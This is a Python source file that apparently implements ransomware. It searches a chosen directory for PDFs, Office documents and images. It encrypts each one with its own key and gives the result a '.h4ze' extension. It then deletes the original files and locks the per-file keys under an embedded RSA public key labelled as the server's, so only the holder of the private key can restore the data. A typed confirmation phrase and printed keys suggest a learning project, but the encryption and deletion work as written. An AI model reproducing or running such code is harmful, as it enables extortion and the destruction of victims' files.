import os
import base64
import pathlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.serialization import load_pem_public_key


# Function to generate public and private keys
def generate_keys():
    # TODO: check if this is even needed
    # Generate a private key for use in the encryption
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Generate a public key
    public_key = private_key.public_key()

    # Return the keys
    return private_key, public_key

# Function generates AES key
def generate_aes_key():
    return Fernet.generate_key()


# Function to encrypt a file
def encrypt_file(file_name, aes_key):
    # Generate a random key
    
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    
    key_out = base64.urlsafe_b64encode(kdf.derive(aes_key))
    enc_file_name = file_name + ".h4ze"

    # Encrypt the file using the key
    with open(file_name, "rb") as f:
        data = f.read()
    encryptor = Fernet(key_out)
    encrypted_data = encryptor.encrypt(data)

    # print("encrypted data: ", encrypted_data, "\n")
    with open(enc_file_name, "wb") as f:
        f.write(encrypted_data)


# Function scan a directory for files larger than a certain size
# and puts them in a list
def scan_dir(dir_name, size):
    _files = []
    for _file in os.listdir(dir_name):
        if (os.path.getsize(os.path.join(dir_name, _file)) > size) and pathlib.Path(_file).suffix in ext:
            file_path = os.path.join(dir_name, _file)
            _files.append(file_path)
    return _files


# Function takes aes key and encrypts it with a public key
def encrypt_aes_key(aes_key):
    
    rsa_public_key = load_pem_public_key(server_public_key, backend=default_backend())

    encrypted_aes_key = rsa_public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return encrypted_aes_key

# Main function
if __name__ == "__main__":

    server_public_key = b"""-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgH7UNQwa7eXZ2qNKR2lzStreiQuQ
M1vSeEb/QsWKGtMfjvWEOiusvpxBWq1HsKAnlhDDnBmePODXC84b1N7vbYSb8wvd
zSh9pSvVDVvuV7OHbq814IGi3gH0yPcXcx1piPomBLOQP+SaRwVm3ARFqxJIPR22
jsxENZYxJNjx+OhJAgMBAAE=
-----END PUBLIC KEY-----"""

    ext = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', ]
    aes_keys = []
    encrypted_keys = []
    aes_keys_encrypted = []
    salt = os.urandom(16)


    print("Enter the path to the directory you want to encrypt: ")
    the_path = input()
    print("ALL FILES IN THIS DIRECTORY WILL BE ENCRYPTED!!!\n")
    print("If you want to continue tyoe 'pinnaple_pizza' and press enter: ")
    answer = input()
    if answer != "pinnaple_pizza":
        print("Exiting...")
        exit()

    files = scan_dir(the_path, 1000)

    for file in files:

        aes_key = generate_aes_key()

        encrypt_file(file, aes_key)
        print(f"[*] Encrypting {file}")
        aes_key_encrypted = encrypt_aes_key(aes_key)
        aes_keys_encrypted.append(aes_key_encrypted)
        print("encrypted key: ", aes_key_encrypted, "\n")
        print("used key: ", aes_key, "\n")
        del aes_key

        os.remove(file)

    # write keys to a file
    with open("keys.txt", "wb") as f:
        for key in aes_keys_encrypted:
            f.write(key)
